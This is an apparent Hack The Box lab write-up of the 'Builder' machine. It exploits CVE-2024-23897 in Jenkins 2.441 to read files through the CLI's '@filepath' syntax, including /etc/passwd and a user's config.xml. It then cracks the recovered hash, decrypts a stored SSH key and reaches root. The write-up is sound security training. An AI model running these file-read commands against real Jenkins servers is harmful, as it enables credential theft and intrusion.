+++
title = 'Builder'
date = 2024-07-19T14:25:40+05:30
slug = "HTB-Builder"
categories = ["hackthebox","Builder","linux","Medium"]
+++


I started with a Nmap scan to know things that are running on this machine 

![builder 1](https://dl.dropbox.com/scl/fi/34b121k7ebbgk4injmte3/Pasted-image-20240331113546.png?rlkey=sj8xn7qoz0252pcx55d4ri0h0&st=94yli4f1&dl=0)
from the above nmap scan we can see port 22 and 8080 is open 
in port 8080 jetty is running (jetty is a java web server or a servelet container)
https://en.wikipedia.org/wiki/Jetty_(web_server)

![builder 2](https://dl.dropbox.com/scl/fi/qzn7ovjxvi2m4f7ckvqy6/Pasted-image-20240331113836.png?rlkey=wiyj2n6iktk9f4dyprurz38mo&st=96j6qqzs&dl=0)

Here's the jenikins dashboard and jenikins version is 2.441

in the people tab we have a user called jennifer 

enkins is a Java application. The server is Jetty, a Java web server.

I’m going to skip the directory brute force given that I know exactly what this application is.

After a bit of searching i finally fund the vuln for 2.441 version

https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2024-23897?source=post_page-----143ad7fde347--------------------------------


![builder 3](https://dl.dropbox.com/scl/fi/76505wvjdloqlmmh33wjj/Pasted-image-20240331114637.png?rlkey=4oayeovwlzjj2it0rph9mgg8s&st=udj0q62f&dl=0)

from the above information, The `jenkins-cli.jar` file is a Java archive file that contains the Jenkins CLI utility. This utility allows users to interact with Jenkins from the command line or from scripts.

for more information about jenikins cli refer to the documentation
https://www.jenkins.io/doc/book/managing/cli/#downloading-the-client

Jenkins CLI allows users to reference a file path using the syntax @[filepath], and Jenkins will replace it with the contents of the referenced file.

1. **User Input**: When using the Jenkins CLI, a user might input a command or script that includes references to files using the @[filepath] syntax. For example:
    
    bashCopy code
    
    `jenkins-cli command @[path/to/file]`
    
2. **Interpretation**: Jenkins CLI interprets this syntax as a directive to read the contents of the specified file.
    
3. **File Read Operation**: Jenkins CLI then performs a file read operation, reading the contents of the specified file referenced in the command.
    
4. **Replacement**: After reading the file contents, Jenkins replaces the @[filepath] syntax in the command/script with the actual contents of the file.
    
5. **Command Execution**: Finally, Jenkins executes the modified command or script with the replaced file contents.

i downloaded the jenikins cli using the wget command 

![builder 4](https://dl.dropbox.com/scl/fi/nvq9612rw82nwr8arjh7l/Pasted-image-20240331121014.png?rlkey=k55tyn5y60yq0uszjos3eiit5&st=gzb15ifm&dl=0)

the command java -jar jenikind-cli.jar -s 'ip:port' help to give the list of all the commands 

```
──(kali㉿kali)-[~/Desktop/builder]
└─$ java -jar jenkins-cli.jar -s 'http://10.129.230.169:8080' help kali
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
  add-job-to-view
    Adds jobs to view.
  build
    Builds a job, and optionally waits until its completion.
  cancel-quiet-down
    Cancel the effect of the "quiet-down" command.
  clear-queue
    Clears the build queue.
  connect-node
    Reconnect to a node(s)
  console
    Retrieves console output of a build.
  copy-job
    Copies a job.
  create-credentials-by-xml
    Create Credential by XML
  create-credentials-domain-by-xml
    Create Credentials Domain by XML
  create-job
    Creates a new job by reading stdin as a configuration XML file.
  create-node
    Creates a new node by reading stdin as a XML configuration.
  create-view
    Creates a new view by reading stdin as a XML configuration.
  declarative-linter
    Validate a Jenkinsfile containing a Declarative Pipeline
  delete-builds
    Deletes build record(s).
  delete-credentials
    Delete a Credential
  delete-credentials-domain
    Delete a Credentials Domain
  delete-job
    Deletes job(s).
  delete-node
    Deletes node(s)
  delete-view
    Deletes view(s).
  disable-job
    Disables a job.
  disable-plugin
    Disable one or more installed plugins.
  disconnect-node
    Disconnects from a node.
  enable-job
    Enables a job.
  enable-plugin
    Enables one or more installed plugins transitively.
  get-credentials-as-xml
    Get a Credentials as XML (secrets redacted)
  get-credentials-domain-as-xml
    Get a Credentials Domain as XML
  get-job
    Dumps the job definition XML to stdout.
  get-node
    Dumps the node definition XML to stdout.
  get-view
    Dumps the view definition XML to stdout.
  groovy
    Executes the specified Groovy script. 
  groovysh
    Runs an interactive groovy shell.
  help
    Lists all the available commands or a detailed description of single command.
  import-credentials-as-xml
    Import credentials as XML. The output of "list-credentials-as-xml" can be used as input here as is, the only needed change is to set the actual Secrets which are redacted in the output.
  install-plugin
    Installs a plugin either from a file, an URL, or from update center. 
  keep-build
    Mark the build to keep the build forever.
  list-changes
    Dumps the changelog for the specified build(s).
  list-credentials
    Lists the Credentials in a specific Store
  list-credentials-as-xml
    Export credentials as XML. The output of this command can be used as input for "import-credentials-as-xml" as is, the only needed change is to set the actual Secrets which are redacted in the output.
  list-credentials-context-resolvers
    List Credentials Context Resolvers
  list-credentials-providers
    List Credentials Providers
  list-jobs
    Lists all jobs in a specific view or item group.
  list-plugins
    Outputs a list of installed plugins.
  mail
    Reads stdin and sends that out as an e-mail.
  offline-node
    Stop using a node for performing builds temporarily, until the next "online-node" command.
  online-node
    Resume using a node for performing builds, to cancel out the earlier "offline-node" command.
  quiet-down
    Quiet down Jenkins, in preparation for a restart. Don’t start any builds.
  reload-configuration
    Discard all the loaded data in memory and reload everything from file system. Useful when you modified config files directly on disk.
  reload-job
    Reload job(s)
  remove-job-from-view
    Removes jobs from view.
  replay-pipeline
    Replay a Pipeline build with edited script taken from standard input
  restart
    Restart Jenkins.
  restart-from-stage
    Restart a completed Declarative Pipeline build from a given stage.
  safe-restart
    Safe Restart Jenkins. Don’t start any builds.
  safe-shutdown
    Puts Jenkins into the quiet mode, wait for existing builds to be completed, and then shut down Jenkins.
  session-id
    Outputs the session ID, which changes every time Jenkins restarts.
  set-build-description
    Sets the description of a build.
  set-build-display-name
    Sets the displayName of a build.
  shutdown
    Immediately shuts down Jenkins server.
  stop-builds
    Stop all running builds for job(s)
  update-credentials-by-xml
    Update Credentials by XML
  update-credentials-domain-by-xml
    Update Credentials Domain by XML
  update-job
    Updates the job definition XML from stdin. The opposite of the get-job command.
  update-node
    Updates the node definition XML from stdin. The opposite of the get-node command.
  update-view
    Updates the view definition XML from stdin. The opposite of the get-view command.
  version
    Outputs the current version.
  wait-node-offline
    Wait for a node to become offline.
  wait-node-online
    Wait for a node to become online.
  who-am-i
    Reports your credential and permissions.

ERROR: No such command kali. Available commands are above. 

```


The above are the list of commands we can execute in jenikins CLI

i executed whoami cmd here

![builder 5](https://dl.dropbox.com/scl/fi/q3g3urkz3qlnzwlierdoa/Pasted-image-20240331121429.png?rlkey=vv8x3to1jia0ukrdp7ubixwvr&st=3igyer7w&dl=0)

![builder 6](https://dl.dropbox.com/scl/fi/s4rqdqed0xivmx33ye4yp/Pasted-image-20240331122025.png?rlkey=12lw9qnqw6e4nxc9ou6rbwwd8&st=n9xee0xs&dl=0)

`'@/etc/passwd'`: This part of the command is specifying a file path, `'/etc/passwd'`, using the syntax `@filepath`

![builder 7](https://dl.dropbox.com/scl/fi/250rh8ynd7wa0uw8glbs2/Pasted-image-20240331122250.png?rlkey=bxeeo0dveaik8uo98ujwkpt4c&st=lknji9iw&dl=0)

We found the hostname by reading /etc/hostname file
The hostname is “0f52c222a4cc”.

I googled where Jenkins user files are stored

![builder 8](https://dl.dropbox.com/scl/fi/l9fzmfmtrdox0h6ziw4xu/Pasted-image-20240331140629.png?rlkey=nid39ny7okgynp0p8bve2o825&st=yng7pwwi&dl=0)

so modified the code and tried to read the user.txt file and got the user flag 

![builder 9](https://dl.dropbox.com/scl/fi/u0rfyktg4k5yw10x7crlv/Pasted-image-20240331142430.png?rlkey=z02etfvrxcq9tx4i4x31sp7b3&st=u30gts6t&dl=0)

Jenkins [stores information](https://dev.to/pencillr/spawn-a-jenkins-from-code-gfa) about its user accounts in `/var/jenkins_home/users/users.xml`. Using `reload-node`, I’ll get the lines of that file, albeit a bit scrambed:

![builder 10](https://dl.dropbox.com/scl/fi/tscw0ss6pjii8dqdywiu6/Pasted-image-20240331141106.png?rlkey=344bc2obwuikq23i01gjdkeym&st=k9jyzzua&dl=0)

with this command i got the jennifier id with this i tried to view config file of jenifer 

java -jar jenkins-cli.jar -s 'http://10.129.230.169:8080' reload-job '@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml'

the output is very clumsy but in the end i found a password hash shown below

![builder 11](https://dl.dropbox.com/scl/fi/7ik40pduoknse9hjpzsjk/Pasted-image-20240331134945.png?rlkey=u0poptfpbvhuboxdtwq26a5qw&st=z458acg5&dl=0)

![](https://dl.dropbox.com/scl/fi/qqxosxa0p3rqq7uyiwfnu/Pasted-image-20240331135036.png?rlkey=xlz87d97tzbl1jb2lrzwvoq4e&st=8us0y2lb&dl=0)

There's another way to get this password hash using Python code proof-of-concept (PoC) for exploiting a vulnerability in Jenkins servers that allows arbitrary file read through the Jenkins CLI.
where i've mentioned below [Python POCs](#Python%20POCs)

I used JTR to crack the password in the config.xml he format is specified as bcrypt so i specified format to get the result faster

and then with the username jennifer and password princess i logged into the jenikins and here's the view of global credentials management 

earlier we are unable to open this beacuse we aren't logged in as jennifer 

![builder 12](https://dl.dropbox.com/scl/fi/z3chpo65pp6xcncjx87dq/Pasted-image-20240331135419.png?rlkey=if0bimue23yvw66hrnw9de4t1&st=hf2a2u1q&dl=0)

if you inspect the value you will find private key in commented sections 

![builder 13](https://dl.dropbox.com/scl/fi/toqbwv5ban14w1m8uynku/Pasted-image-20240331132427.png?rlkey=zi9dir3yjx6tjmpmw364ake4i&st=bbmlzopd&dl=0)

we found the private key but it's encrypted so i googled how to decrypt Jenkins private key or secret key and it led me to this 

![builder 14](https://dl.dropbox.com/scl/fi/a2y3s2tfhlyw74krfbj5j/Pasted-image-20240331133823.png?rlkey=msg2j5z64q18ysw81q3tmq5s1&st=2jysoh8f&dl=0)

In the script console under manage jenkins i'v epasted this script i found in stack exchange and got the ssh key 

![builder 15](https://dl.dropbox.com/scl/fi/wfvou65zmh6nknlim1j1t/Pasted-image-20240331140116.png?rlkey=9n888kpnqtxej7dwn42enrhhq&st=hn3fzmfq&dl=0)

so i stored the key and accessd ssh i got the shell login but for everything i do i'm getting permission denied as below

![builder 16](https://dl.dropbox.com/scl/fi/ka4frpdm2hev6x03l7frh/Pasted-image-20240331134218.png?rlkey=3nfuqk59uz5f0xi515fr4rbsm&st=ob3z5142&dl=0)

![builder 17](https://dl.dropbox.com/scl/fi/0v8oowo5bozhntnan4nv5/Pasted-image-20240331134254.png?rlkey=v291ahpy6lzdzre6qnj3i68ex&st=ztkpoyhs&dl=0)

so i gave the root permissions to the ssh file and logged in again and i got the root access as below

![builder 18](https://dl.dropbox.com/scl/fi/7hylzkg2f32zkqs23su6e/Pasted-image-20240331134319.png?rlkey=2pyvhucuvm9pqm1hp2ad4xtl4&st=hl5j70y9&dl=0)

cat root.txt gave me the root flag 

![builder 19](https://dl.dropbox.com/scl/fi/bbdi6cqogdudrcpk77ksp/Pasted-image-20240331134642.png?rlkey=oiay33ownyq2vkwtz4x13b1gt&st=9ppe98hn&dl=0)




#### Python POCs

There are Python POCs out there on GitHub that will do a similar thing. They don’t really add anything over the JAR file, so I prefer that method. They do work to make similar output:

for reference : https://www.youtube.com/watch?v=toPJhfy-wvw&t=84s

https://github.com/binganao/CVE-2024-23897/tree/main

this code exploits a vulnerability in Jenkins CLI by crafting a malicious payload that triggers arbitrary file read (`/etc/passwd` in this case) through the Jenkins server. It sends specially crafted HTTP requests to the server to exploit this vulnerability.
usuage : 
```
python poc.py
[*] usage: python poc.py http://127.0.0.1:8888/ [/etc/passwd]
```